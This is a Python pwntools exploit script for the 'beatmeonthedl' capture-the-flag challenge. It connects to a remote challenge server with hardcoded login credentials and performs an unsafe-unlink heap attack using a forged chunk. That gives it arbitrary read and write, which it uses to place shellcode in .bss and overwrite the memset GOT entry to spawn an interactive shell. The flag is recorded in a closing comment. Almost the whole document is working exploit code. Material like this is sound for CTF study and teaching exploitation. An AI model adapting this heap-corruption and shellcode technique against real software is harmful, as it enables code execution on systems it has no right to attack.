#!/usr/bin/env python

from pwn import *

elf = ELF("./beatmeonthedl")
context.binary = elf

def connect():
    global p
    #p = process(elf.file.name)
    p = remote("beatmeonthedl_498e7cad3320af23962c78c7ebe47e16.quals.shallweplayaga.me",6969)
    p.recvuntil("username: ")

def login():
    p.sendline("mcfly")
    p.recvuntil("Pass: ")
    p.sendline("awesnap")
    p.recvuntil("| ")

def make_entry(txt):
    p.sendline("1")
    p.recvuntil("Request text > ")
    p.sendline(txt)
    p.recvuntil("| ")

def change_entry(entry,txt):
    p.sendline("4")
    p.recvuntil("choice: ")
    p.sendline(str(entry))
    p.recvuntil("data: ")
    p.send_raw(txt)
    p.recvuntil("| ")

def delete_entry(entry):
    p.sendline("3")
    p.recvuntil("choice: ")
    p.sendline(str(entry))
    p.recvuntil("| ")

connect()
login()

chunk_zero_ptr = 0x609e80


# Setup two heap entries
make_entry("test")
make_entry("test")

# Setup a fake chunk
s = p64(0) # Prev_size
s += p64(0) # size/AMP
s += p64(chunk_zero_ptr - (8*3)) # fd_next
s += p64(chunk_zero_ptr - (8*2)) # fd_back
s += "A"*(48-len(s)) # Write up to the meta data
s += p64(0x42 - 18) # Previous Size (points to start of our data)
s += p64(0x42) # Original size value, minus the in-use-flag

change_entry(0,s + "\n")

# Delete the first
delete_entry(1)

# Now, our pointer for entry 0 always points just before itself.
# So long as we keep that pointer the same, i have an arbitrary 
# read and write primitive
entry_zero = 0x609E68 # Make sure to write this back to entry 0
entry_zero_offset = 24 # 24 chars from where we started to entry_zero

bss_target = 0x609D60 # Where we will write shellcode to

# First off, setup a pointer to the bss section to write shellcode
s = "A"*entry_zero_offset + p64(entry_zero) # Make sure to put that back
s += p64(bss_target) # Where pointer we will use to write shellcode
s += p64(elf.symbols['got.memset']) # We want to overwrite memset later
s += "\x00" * (0x78 - len(s)) # Pad out the rest so we don't hit a print problem

# Overwrite our pointers
change_entry(0,s)

# Now entry 1 (the second entry) points to that bss segment
# Generate some shellcode
shellcode = asm(shellcraft.sh())

# Write it
change_entry(1, shellcode + "\n")

# Now overwrite memset with address of our shellcode
change_entry(2, p64(bss_target) + "\n")

# We should have a shell waiting
p.interactive()

# The flag is: 3asy p33zy h3ap hacking!!
